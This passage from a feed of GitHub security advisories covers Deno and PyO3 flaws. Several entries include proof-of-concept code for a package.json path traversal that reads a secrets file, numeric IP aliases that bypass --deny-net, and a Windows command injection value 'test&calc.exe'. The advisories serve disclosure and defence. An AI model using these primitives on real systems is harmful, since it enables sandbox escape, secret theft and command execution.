<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-8xpq-cjcf-3wh9">https://github.com/denoland/deno/security/advisories/GHSA-8xpq-cjcf-3wh9</a></li>
<li><a href="https://github.com/advisories/GHSA-8xpq-cjcf-3wh9">https://github.com/advisories/GHSA-8xpq-cjcf-3wh9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8xpq-cjcf-3wh9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T19:11:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno: BYONM module resolution allows `package.json` main path traversal to bypass `--allow-read` restrictions]]></title>
        <id>https://github.com/advisories/GHSA-968w-xfqw-vp9q</id>
        <link href="https://github.com/advisories/GHSA-968w-xfqw-vp9q"/>
        <updated>2026-06-16T19:11:29.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When Deno was run in BYONM mode (<code>nodeModulesDir: "manual"</code>), the module resolver did not validate that a package's resolved entrypoint stayed within its <code>node_modules/&lt;pkg&gt;/</code> directory. A malicious <code>package.json</code> whose <code>main</code> field contained <code>..</code> segments was able to resolve to an arbitrary path on disk, and the resolver then read that file without consulting the <code>--allow-read</code> allowlist. This let a <code>require("evil-pkg")</code> call return the contents of a file that a direct <code>Deno.readTextFileSync(...)</code> call would have been blocked from reading.</p>
<h2 id="details">Details</h2>
<p>In BYONM mode, Deno resolved npm packages directly from a user-managed <code>node_modules</code> tree. Resolution of <code>require("pkg")</code> proceeded by reading <code>pkg/package.json</code>, taking the <code>main</code> field, joining it to the package directory, and loading the result as a module.</p>
<p>The path joined from <code>main</code> was not constrained to the package root. A <code>package.json</code> such as:</p>
<pre><code class="language-json">{ "main": "../../../secret.json" }
</code></pre>
<p>resolved to <code>node_modules/pkg/../../../secret.json</code>, escaping <code>node_modules</code> entirely. The BYONM permission check accepted any path that contained a <code>node_modules</code> component and did not reject <code>..</code> traversal, so the resolved path was loaded without a read-permission check.</p>
<p>Because resolution loaded JSON entrypoints by parsing their contents and returning them through <code>require</code>, this exposed the contents of arbitrary <code>.json</code> files reachable by the OS user to the requiring code, even when <code>--allow-read</code> had been narrowed to a specific directory.</p>
<p>The same file accessed via <code>Deno.readTextFileSync</code> was correctly blocked. The bug was that module resolution did not enforce the same read-permission boundary that the filesystem APIs enforced.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>The reporter supplied a self-contained PoC. Layout:</p>
<pre><code>/tmp/deno_byonm_poc/
├── app/
│   ├── deno.json            (BYONM enabled)
│   ├── exploit.ts           (require("evil-pkg"))
│   └── node_modules/
│       └── evil-pkg/
│           └── package.json (main: "../../../secret.json")
└── secret.json              (outside --allow-read scope)
</code></pre>
<p>Run:</p>
<pre><code class="language-bash">deno run --no-prompt --allow-read=/tmp/deno_byonm_poc/app exploit.ts
</code></pre>
<p>Observed:</p>
<ul>
<li><code>Deno.readTextFileSync("/tmp/deno_byonm_poc/secret.json")</code> — blocked, as
expected.</li>
<li><code>require("evil-pkg")</code> — returned the parsed contents of <code>secret.json</code>,
bypassing the read allowlist.</li>
</ul>
<p>A control run with BYONM disabled (<code>--no-config</code>) blocked the <code>require</code> call.</p>
<h2 id="impact">Impact</h2>
<p>The vulnerability allowed a hostile npm package installed under a BYONM <code>node_modules</code> to read JSON files outside the directories granted via <code>--allow-read</code>, up to the privileges of the OS user running Deno. In practice this exposed configuration and credential files (<code>.env.json</code>, cloud credentials, package lockfiles, etc.) that the user had deliberately excluded from the read scope.</p>
<p>The vulnerability did not grant any capability beyond what the OS user already held, did not affect runs that granted unrestricted <code>--allow-read</code>, and required the user to have installed and then required a hostile package, i.e. an existing supply-chain compromise. The reason it warranted a security advisory rather than a routine bug fix is that Deno's permission model
promised that <code>--allow-read=&lt;scope&gt;</code> was a hard boundary <em>even over untrusted npm code</em>, and that promise was broken.</p>
<p>Not affected:</p>
<ul>
<li>Runs without BYONM (default npm resolution went through a separate code
path that rejected the traversal).</li>
<li>Runs with full <code>--allow-read</code> (no boundary to bypass).</li>
<li>Non-JSON entrypoints, in practice — <code>.js</code>/<code>.cjs</code>/<code>.mjs</code> targets executed
rather than exposing file contents, which already implied attacker code
execution within the granted permission set.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>Users on unpatched versions could mitigate by:</p>
<ul>
<li>Avoiding BYONM mode (<code>nodeModulesDir: "manual"</code>) for projects that depended
on untrusted packages.</li>
<li>Auditing <code>package.json</code> <code>main</code> fields in <code>node_modules</code> for <code>..</code> segments
before running.</li>
<li>Granting <code>--allow-read</code> only when the read scope already covered every file
the OS user could see (in which case there was no boundary to bypass and no
additional exposure).</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-968w-xfqw-vp9q">https://github.com/denoland/deno/security/advisories/GHSA-968w-xfqw-vp9q</a></li>
<li><a href="https://github.com/advisories/GHSA-968w-xfqw-vp9q">https://github.com/advisories/GHSA-968w-xfqw-vp9q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-968w-xfqw-vp9q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T19:11:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno: Node TCPWrap numeric hostname aliases bypass --deny-net resolved-IP deny checks]]></title>
        <id>https://github.com/advisories/GHSA-v8fw-85r8-5m23</id>
        <link href="https://github.com/advisories/GHSA-v8fw-85r8-5m23"/>
        <updated>2026-06-16T19:09:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Deno's network permission model is designed so that <code>--deny-net</code> rules apply to the <strong>resolved IP address</strong> of a destination, not just the literal string supplied by the caller. That means <code>--deny-net=127.0.0.1</code> (or <code>--deny-net=127.0.0.0/8</code>) is expected to block any attempt to reach loopback, regardless of how the hostname is spelled.</p>
<p>On affected versions, the Node.js compatibility TCP path checked the permission against the <strong>original hostname string</strong> before resolution and then did not re-check after resolution. A caller could therefore pass a numeric alias of an IP address (for example the decimal integer <code>2130706433</code> or the hex form <code>0x7f000001</code>, both of which resolve to <code>127.0.0.1</code>) and reach the denied destination through <code>node:net.connect</code> or <code>node:http.request</code>'s <code>{ host, port }</code> options form.</p>
<p>The native <code>Deno.connect()</code>, <code>fetch()</code>, and URL-string variants of <code>node:http.request("http://...")</code> were not affected, because they either re-checked permissions after resolution or normalized the hostname through the URL parser before checking.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Run on Deno <code>2.7.14</code>, with a local TCP listener on <code>127.0.0.1:&lt;PORT&gt;</code>:</p>
<pre><code class="language-js">import net from "node:net";

// --allow-net + --deny-net=127.0.0.0/8
// (or even --deny-net=127.0.0.1:&lt;PORT&gt;)
net.connect({ host: "2130706433", port: PORT });     // CONNECTED ❌
net.connect({ host: "0x7f000001", port: PORT });     // CONNECTED ❌
net.connect({ host: "127.0.0.1",  port: PORT });     // denied ✅
</code></pre>
<p>The same primitive reached the loopback HTTP listener through <code>node:http</code> when the destination was passed as options rather than as a URL string:</p>
<pre><code class="language-js">import http from "node:http";

// options-form host — bypasses the deny rule on affected versions
http.request({ hostname: "2130706433", port: PORT, path: "/" }).end();

// URL-string form — correctly denied (URL parser normalizes the host)
http.request(`http://2130706433:${PORT}/`).end();
</code></pre>
<p>The server-side log showed the bypassed requests arriving from <code>127.0.0.1</code> with the numeric alias preserved in the <code>Host</code> header.</p>
<h2 id="impact">Impact</h2>
<p>A program that intentionally allows broad outbound network access but uses <code>--deny-net</code> to carve out protected destinations, typically loopback, private/internal ranges, or cloud-instance metadata IPs, could be made to reach those denied destinations from less-trusted code (a dependency, plugin, or attacker-controlled input) that funnels through <code>node:net.connect({ host })</code> or <code>node:http.request({ hostname })</code>.</p>
<p>The CVSS vector reflects this as a local-attack-vector, permissions-required confidentiality impact: the attacker needs to be able to run code inside the Deno process, and the demonstrated primitive is "reach an explicitly denied IP." It does not by itself exfiltrate data or execute code; the further impact depends on what the now-reachable endpoint exposes.</p>
<p>The confirmed scope is <strong>IPv4 numeric hostname aliases</strong> reaching a denied resolved IP through the Node TCPWrap / options-host path. URL strings, <code>node:http2</code>, <code>undici</code>, and IPv6 numeric/mapped-address variants were not exhaustively tested by the reporter.</p>
<h2 id="not-affected">Not affected</h2>
<ul>
<li>Programs that do not use <code>--deny-net</code> at all (the bug is specifically about deny rules being bypassed; allow rules were always checked against the original string).</li>
<li>Native Deno networking APIs (<code>Deno.connect</code>, <code>Deno.connectTls</code>, <code>fetch</code>, ...), these already re-checked permissions after resolution as of PR #33203.</li>
<li>URL-string callers such as <code>fetch("http://2130706433/")</code> or <code>node:http.request("http://2130706433/")</code>, the URL parser normalized the hostname to its dotted-quad form before the   permission check ran.</li>
<li>Calls that do not provide <code>host</code>/<code>hostname</code> (e.g. connecting by IP literal or by a name that the deny rule already matches verbatim).</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>If you cannot upgrade immediately, reduce exposure by:</p>
<ul>
<li><strong>Preferring an <code>--allow-net</code> allowlist over a <code>--deny-net</code> denylist.</strong> An allowlist denies numeric aliases by default because they don't match the listed hostnames; only the destinations you've explicitly permitted can be reached.</li>
<li><strong>Validating untrusted host input</strong> before passing it to <code>node:net.connect</code> / <code>node:http.request</code>. Reject hostnames that are purely decimal integers (<code>/^\d+$/</code>) or begin with <code>0x</code>, as these are the alias forms exploited by the bypass.</li>
<li><strong>Avoiding the Node options-host path for sensitive calls</strong> in favour of URL-string forms, which are normalized by the URL parser before the permission check.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-v8fw-85r8-5m23">https://github.com/denoland/deno/security/advisories/GHSA-v8fw-85r8-5m23</a></li>
<li><a href="https://github.com/advisories/GHSA-v8fw-85r8-5m23">https://github.com/advisories/GHSA-v8fw-85r8-5m23</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8fw-85r8-5m23</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T19:09:46.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno: Miller-Rabin Primality Test Allows Zero Rounds]]></title>
        <id>https://github.com/advisories/GHSA-9xg4-qhm4-g43w</id>
        <link href="https://github.com/advisories/GHSA-9xg4-qhm4-g43w"/>
        <updated>2026-06-16T19:08:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>node:crypto.checkPrime(candidate[, options][, callback])</code> and <code>crypto.checkPrimeSync(candidate[, options])</code> ran no Miller-Rabin rounds at all when the caller left <code>options.checks</code> at its default of <code>0</code>. In that mode, the only test applied to the candidate was trial division by the primes up to <code>17,863</code>. Any composite whose smallest prime factor exceeds that bound — for example the product of two primes just above it, such as <code>17,881 × 17,891</code> — was reported as <code>true</code> ("probably prime").</p>
<p>The same divergence affected the lower-level <code>op_node_check_prime</code> / <code>op_node_check_prime_bytes</code> paths that the polyfill calls into.</p>
<p>Node.js itself does not have this problem: it forwards <code>checks = 0</code> to OpenSSL's <code>BN_check_prime</code>, which substitutes a sensible default number of rounds based on the candidate's bit length (per FIPS 186-4 Appendix C.3 Table C.1). Deno's Rust implementation had no equivalent fallback, so <code>count = 0</code> meant "skip the loop entirely."</p>
<h2 id="affected-apis">Affected APIs</h2>
<ul>
<li><code>crypto.checkPrime(candidate)</code> (callback form, default options)</li>
<li><code>crypto.checkPrime(candidate, { checks: 0 }, callback)</code></li>
<li><code>crypto.checkPrimeSync(candidate)</code> (default options)</li>
<li><code>crypto.checkPrimeSync(candidate, { checks: 0 })</code></li>
</ul>
<p>Callers who explicitly passed <code>checks &gt;= 1</code> were less affected, the loop ran the number of rounds they asked for, but were still receiving fewer rounds than Node would have applied for the same bit length. With the patched version they get at least the FIPS minimum.</p>
<h2 id="not-affected">Not affected</h2>
<ul>
<li>Deno's prime <em>generation</em> (<code>crypto.generatePrime</code>, <code>crypto.generatePrimeSync</code>, and the DH parameter generation path). Those routes go through <code>Prime::generate_with_options</code> in <code>ext/node_crypto/primes.rs</code>, which hardcodes <code>20</code> Miller-Rabin rounds and never reads a user-controlled <code>checks</code> value, so the bug never reached them.</li>
<li>Any other Deno-internal use of primality testing — <code>is_probably_prime</code> is not called from elsewhere in the runtime with <code>count = 0</code>. </li>
<li>Web Crypto (<code>crypto.subtle.*</code>), which uses entirely separate code paths and does not expose a primality test.</li>
</ul>
<h2 id="impact">Impact</h2>
<p>The realistic exposure is application-level: a Deno program that calls <code>crypto.checkPrime</code> (or its sync variant) with default options to validate an externally-supplied bignum, for example checking a peer-provided Diffie-Hellman prime, validating a prime read from configuration, or sanity-checking an RSA factor, will accept crafted composites as prime. The composite is trivial to construct: any product of two primes greater than <code>17,863</code> works.</p>
<p>Downstream consequences depend on what the program does with the "verified" prime. If the prime is fed into a key exchange, signature verification, or factorization-style check, the security guarantees of that protocol collapse to whatever the attacker engineered into the composite.</p>
<p>The CVSS impact is bounded by the requirement that the victim application both (a) calls <code>checkPrime</code> with default options and (b) acts on the result for security-relevant input it does not control.</p>
<h2 id="reproduction">Reproduction</h2>
<pre><code class="language-ts">import { checkPrimeSync } from "node:crypto";

// 17881 and 17891 are both prime and both above the trial-division
// ceiling used by Deno's implementation.
const composite = 17881n * 17891n;

// Affected versions print `true`; the patched version prints `false`.
console.log(checkPrimeSync(composite));
</code></pre>
<p>The same result is reproducible from Rust against the internal helper:</p>
<pre><code class="language-rust">use num_bigint::BigInt;
let composite = BigInt::from(17881u32) * BigInt::from(17891u32);
assert!(!is_probably_prime(&amp;composite, 0)); // fails on affected versions
</code></pre>
<h2 id="fix">Fix</h2>
<p>PR <a href="https://github.com/denoland/deno/pull/34391">#34391</a> introduces a
helper <code>min_miller_rabin_rounds_for_bits(bits)</code> that returns the FIPS
186-4 Appendix C.3 round counts, matching the defaults OpenSSL uses
inside <code>BN_check_prime</code>. <code>is_probably_prime</code> then clamps the loop bound
to <code>count.max(min_miller_rabin_rounds_for_bits(n.bits()))</code>. The
probabilistic loop now always executes, regardless of what <code>checks</code>
value the caller supplied, with a round count strong enough to keep the
false-positive probability below 2^-80. Callers that pass a larger
explicit <code>checks</code> still get exactly that many rounds.</p>
<p>Unit tests under <code>ext/node_crypto/primes.rs</code> cover the
<code>17,881 × 17,891</code> case, a larger 64-bit composite, and the FIPS lookup
table itself.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If you cannot upgrade immediately:</p>
<ul>
<li><strong>Pass an explicit <code>checks</code> value</strong> when calling <code>crypto.checkPrime</code> or <code>crypto.checkPrimeSync</code>. A value of <code>64</code> is conservative for any reasonable bit length and keeps the loop running.</li>
<li><strong>Do not rely on <code>crypto.checkPrime</code> to validate attacker-influenced bignums</strong> in security-critical paths until you are on the patched release.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-9xg4-qhm4-g43w">https://github.com/denoland/deno/security/advisories/GHSA-9xg4-qhm4-g43w</a></li>
<li><a href="https://github.com/denoland/deno/pull/34391">https://github.com/denoland/deno/pull/34391</a></li>
<li><a href="https://github.com/advisories/GHSA-9xg4-qhm4-g43w">https://github.com/advisories/GHSA-9xg4-qhm4-g43w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9xg4-qhm4-g43w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-16T19:08:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno: Command Injection via spawnSync & spawn on Windows]]></title>
        <id>https://github.com/advisories/GHSA-7xh3-mhg9-jcw8</id>
        <link href="https://github.com/advisories/GHSA-7xh3-mhg9-jcw8"/>
        <updated>2026-06-16T19:07:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Deno's <code>node:child_process</code> implementation provided an <code>escapeShellArg()</code> helper used when callers passed <code>shell: true</code> to <code>spawn</code> / <code>spawnSync</code> / <code>exec</code> and friends. On Windows, the helper failed to quote arguments that contained <code>cmd.exe</code> metacharacters such as <code>&amp;</code>, <code>|</code>, <code>&lt;</code>, <code>&gt;</code>, <code>^</code>, <code>!</code>, <code>(</code>, <code>)</code>, and did not neutralize <code>%</code> (which <code>cmd.exe</code> expands even inside double-quoted strings). An attacker who controlled any portion of an argument passed to such a call could inject arbitrary additional commands into the spawned <code>cmd.exe</code> invocation.</p>
<p>This was the Windows counterpart to CVE-2026-27190, which fixed the same class of bug in the Unix branch of <code>escapeShellArg</code>.</p>
<h2 id="details">Details</h2>
<p>On Windows, <code>child_process</code> with <code>shell: true</code> ran the command via <code>cmd.exe /d /s /c "&lt;command line&gt;"</code>. Deno assembled that command line by joining the program name and each argument through <code>escapeShellArg()</code>.</p>
<p>The vulnerable check was:</p>
<pre><code class="language-ts">// If no special characters, return as-is
if (!/[\s"\\]/.test(arg)) {
  return arg;
}
</code></pre>
<p>The regex covered only whitespace, double-quote, and backslash. Any argument containing <code>cmd.exe</code>-significant characters but none of those three was returned unquoted and therefore interpreted by the shell. The most straightforward exploit chained commands with <code>&amp;</code>:</p>
<pre><code class="language-js">import { spawnSync } from "node:child_process";

spawnSync("echo", ["test&amp;calc.exe"], { shell: true, encoding: "utf-8" });
</code></pre>
<p>The reporter confirmed this launched <code>calc.exe</code> on Windows 11 with Deno 2.7.5. The same shape worked for <code>|</code>, <code>&lt;</code>, <code>&gt;</code>, <code>^</code>, <code>!</code>, <code>(</code>, and <code>)</code>.</p>
<p>A secondary defect existed even when arguments were quoted: <code>cmd.exe</code> expands <code>%FOO%</code> environment-variable references inside double-quoted strings. Without either doubling <code>%</code> or rejecting it, an argument like <code>"%USERPROFILE%"</code> leaked environment data into the command line.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>From the report, run on Windows with Deno <code>&lt; 2.7.10</code>:</p>
<pre><code class="language-js">import { spawnSync } from "node:child_process";

const maliciousInput = "test&amp;calc.exe";
const result = spawnSync("echo", [maliciousInput], {
  shell: true,
  encoding: "utf-8",
});
console.log(result);
</code></pre>
<p>Observed: <code>calc.exe</code> launched as a side effect of the <code>echo</code> call.</p>
<h2 id="impact">Impact</h2>
<p>Any Deno program on Windows that called <code>child_process.spawn</code> / <code>spawnSync</code> / <code>exec</code> (or any shell helper that funneled through <code>escapeShellArg</code>) with <code>shell: true</code> and incorporated untrusted input into an argument was exposed to arbitrary command execution in the context of the Deno process. The CVSS vector treated this as network-reachable / high-complexity because the typical exposure path was a Deno service accepting external input and forwarding it to a shelled-out subprocess.</p>
<p>Not affected:</p>
<ul>
<li>Calls without <code>shell: true</code> (the default), which executed the program directly via <code>CreateProcess</code> without <code>cmd.exe</code> interpretation.</li>
<li>Unix platforms, which used the single-quote branch of <code>escapeShellArg</code> and were already fixed under CVE-2026-27190.</li>
<li>Callers that built command strings themselves and passed them as a single string with <code>shell: true</code> — those were the caller's responsibility and were never sanitized by Deno.</li>
</ul>
<h2 id="workarounds">Workarounds</h2>
<p>Users on unpatched versions could mitigate by:</p>
<ul>
<li>Avoiding <code>shell: true</code> in <code>node:child_process</code> calls on Windows.</li>
<li>Building the argv directly and invoking the program without a shell.</li>
<li>Filtering or rejecting any externally-supplied argument values that contained <code>cmd.exe</code> metacharacters (<code>&amp; | &lt; &gt; ^ ! ( ) %</code>) before passing them to <code>spawn</code> / <code>spawnSync</code> / <code>exec</code>.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-7xh3-mhg9-jcw8">https://github.com/denoland/deno/security/advisories/GHSA-7xh3-mhg9-jcw8</a></li>
<li><a href="https://github.com/advisories/GHSA-7xh3-mhg9-jcw8">https://github.com/advisories/GHSA-7xh3-mhg9-jcw8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7xh3-mhg9-jcw8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-16T19:07:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno: process.loadEnvFile() bypasses env permission checks and mutates process.env with only read access]]></title>
        <id>https://github.com/advisories/GHSA-4c8g-jvcx-v4hv</id>
        <link href="https://github.com/advisories/GHSA-4c8g-jvcx-v4hv"/>
        <updated>2026-06-16T19:04:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In Deno, environment access is gated by the <code>env</code> permission. You can deny it
with <code>--deny-env</code>, or restrict it to a specific allowlist with
<code>--allow-env=FOO,BAR</code>. The expectation is that a program running without <code>env</code>
permission cannot change <code>process.env</code>.</p>
<p><code>process.loadEnvFile()</code> (the Node-compatible API for loading variables from a
<code>.env</code> file) does <strong>not</strong> honor this. It only checks that the program has
<strong>read</strong> permission for the dotenv file, then writes every key in that file
into the process environment — even when <code>env</code> access is denied.</p>
<p>In effect, <strong><code>--allow-read</code> plus a writable or attacker-controlled <code>.env</code> file
is enough to defeat <code>--deny-env</code>.</strong></p>
<h2 id="am-i-affected">Am I affected?</h2>
<p>You are potentially affected if <strong>all</strong> of the following are true:</p>
<ol>
<li>You run Deno <strong>v2.3.0 or newer</strong>.</li>
<li>Your program (or any dependency it imports) calls <code>process.loadEnvFile()</code>
from <code>node:process</code>.</li>
<li>You rely on Deno's permission model — specifically <code>--deny-env</code>, an
<code>--allow-env=…</code> allowlist, or running without granting <code>env</code> — as a
security boundary.</li>
<li>The <code>.env</code> path passed to <code>loadEnvFile()</code> can be controlled or modified by
a less-trusted party (untrusted input, user-writable directory, third-party
dependency, etc.) and is covered by your <code>--allow-read</code> grant.</li>
</ol>
<p>If your program does not use <code>process.loadEnvFile()</code> at all, or if it already
grants full <code>env</code> access, this advisory does not change your risk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-4c8g-jvcx-v4hv">https://github.com/denoland/deno/security/advisories/GHSA-4c8g-jvcx-v4hv</a></li>
<li><a href="https://github.com/advisories/GHSA-4c8g-jvcx-v4hv">https://github.com/advisories/GHSA-4c8g-jvcx-v4hv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4c8g-jvcx-v4hv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T19:04:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno: WebSocket API sandbox bypass via missing post-DNS check]]></title>
        <id>https://github.com/advisories/GHSA-83pc-3rw9-qpwj</id>
        <link href="https://github.com/advisories/GHSA-83pc-3rw9-qpwj"/>
        <updated>2026-06-16T19:04:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When a WebSocket connection was opened, Deno checked the destination hostname
against <code>--deny-net</code> rules but did not re-check the IP addresses that hostname
resolved to. An attacker-controlled script could use a specially crafted domain
name that passes the hostname check yet resolves to a denied IP, bypassing the
network restriction entirely.</p>
<h2 id="impact">Impact</h2>
<p>Code running under <code>--deny-net</code> could connect to hosts that the user intended
to block. In practice this means network isolation rules — for example,
blocking access to <code>localhost</code> or internal services — could be silently
circumvented by a malicious or compromised dependency.</p>
<p><code>Deno.connect</code> and <code>fetch()</code> were not affected by this specific issue (a
companion advisory covers <code>fetch()</code>).</p>
<h2 id="who-is-affected">Who is affected</h2>
<p>Users who:</p>
<ul>
<li>run untrusted or third-party code with <code>deno run</code>, and</li>
<li>rely on <code>--deny-net</code> to restrict which hosts that code can reach.</li>
</ul>
<p>If you do not use <code>--deny-net</code>, or if you only run fully trusted code, you are
not affected.</p>
<h2 id="workaround">Workaround</h2>
<p>No workaround is available short of upgrading. If upgrading immediately is not
possible, avoid granting <code>--allow-net</code> to untrusted code that also has
<code>--deny-net</code> restrictions you depend on for security.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-83pc-3rw9-qpwj">https://github.com/denoland/deno/security/advisories/GHSA-83pc-3rw9-qpwj</a></li>
<li><a href="https://github.com/advisories/GHSA-83pc-3rw9-qpwj">https://github.com/advisories/GHSA-83pc-3rw9-qpwj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-83pc-3rw9-qpwj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T19:04:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deno] Deno: `fetch()` API sandbox bypass via missing DNS resolution check]]></title>
        <id>https://github.com/advisories/GHSA-cpgj-f7g3-2pp2</id>
        <link href="https://github.com/advisories/GHSA-cpgj-f7g3-2pp2"/>
        <updated>2026-06-16T19:02:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When <code>fetch()</code> was called, Deno checked the destination hostname against
<code>--deny-net</code> rules but did not re-check the IP addresses that hostname
resolved to. An attacker-controlled script could use a specially crafted domain
name that passes the hostname check yet resolves to a denied IP, bypassing the
network restriction entirely.</p>
<h2 id="impact">Impact</h2>
<p>Code running under <code>--deny-net</code> could reach hosts that the user intended to
block. In practice this means network isolation rules — for example, blocking
access to <code>localhost</code> or internal services — could be silently circumvented by
a malicious or compromised dependency.</p>
<p>A companion advisory covers the same class of issue in the WebSocket API.</p>
<h2 id="who-is-affected">Who is affected</h2>
<p>Users who:</p>
<ul>
<li>run untrusted or third-party code with <code>deno run</code>, and</li>
<li>rely on <code>--deny-net</code> to restrict which hosts that code can reach.</li>
</ul>
<p>If you do not use <code>--deny-net</code>, or if you only run fully trusted code, you are
not affected.</p>
<h2 id="workaround">Workaround</h2>
<p>No workaround is available short of upgrading. If upgrading immediately is not
possible, avoid granting <code>--allow-net</code> to untrusted code that also has
<code>--deny-net</code> restrictions you depend on for security.</p>
<h2 id="fix">Fix</h2>
<p>The <code>fetch()</code> DNS resolver now performs a post-resolution check on every IP
address before passing it to the HTTP connector, consistent with how
<code>Deno.connect</code> already behaved.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/denoland/deno/security/advisories/GHSA-cpgj-f7g3-2pp2">https://github.com/denoland/deno/security/advisories/GHSA-cpgj-f7g3-2pp2</a></li>
<li><a href="https://github.com/advisories/GHSA-cpgj-f7g3-2pp2">https://github.com/advisories/GHSA-cpgj-f7g3-2pp2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cpgj-f7g3-2pp2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T19:02:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyo3] PyO3 has a missing `Sync` bound on `PyCFunction::new_closure` closures]]></title>
        <id>https://github.com/advisories/GHSA-chgr-c6px-7xpp</id>
        <link href="https://github.com/advisories/GHSA-chgr-c6px-7xpp"/>
        <updated>2026-06-12T20:09:09.000Z</updated>
        <content type="html"><![CDATA[<p><code>PyCFunction::new_closure</code> (and the temporary <code>new_closure_bound</code> complement in the 0.21–0.22 series) required the supplied closure to be <code>Send + 'static</code> but not <code>Sync</code>. The resulting <code>PyCFunction</code> is a Python callable that can be invoked from any Python thread, which means the closure may be called concurrently from multiple threads, and needs a <code>Sync</code> bound to prevent possible data races.</p>
<p>The problem exists under all Python versions but is particularly vulnerable under the newer free-threaded Python variant, which do not have serial execution imposed by the Global Interpreter Lock. Under releases protected by the GIL, the ability to "detach" from the Python interpreter temporarily inside the closure (e.g. by <code>Python::detach</code>) makes it possible for interleaved and/or concurrent execution of various portions of the closure.</p>
<p>PyO3 0.29.0 added a <code>Sync</code> bound to close this thread-safety bug.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PyO3/pyo3/pull/6096">https://github.com/PyO3/pyo3/pull/6096</a></li>
<li><a href="https://github.com/PyO3/pyo3/releases/tag/v0.29.0">https://github.com/PyO3/pyo3/releases/tag/v0.29.0</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0177.html">https://rustsec.org/advisories/RUSTSEC-2026-0177.html</a></li>
<li><a href="https://github.com/advisories/GHSA-chgr-c6px-7xpp">https://github.com/advisories/GHSA-chgr-c6px-7xpp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-chgr-c6px-7xpp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-12T20:09:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyo3] PyO3 has an Out-of-bounds Read in `nth` / `nth_back` for `PyList` and `PyTuple` iterators]]></title>
        <id>https://github.com/advisories/GHSA-36hh-v3qg-5jq4</id>
        <link href="https://github.com/advisories/GHSA-36hh-v3qg-5jq4"/>
        <updated>2026-06-12T19:32:49.000Z</updated>
        <content type="html"><![CDATA[<p>PyO3 0.24.0 added optimized implementations of <code>Iterator::nth</code> and <code>DoubleEndedIterator::nth_back</code> for the <code>BoundListIterator</code> and <code>BoundTupleIterator</code> types. These implementations computed the target index using unchecked <code>usize</code> addition (<code>index + n</code>) before bounds-checking against the sequence length, then read the element via <code>get_item_unchecked</code>.</p>
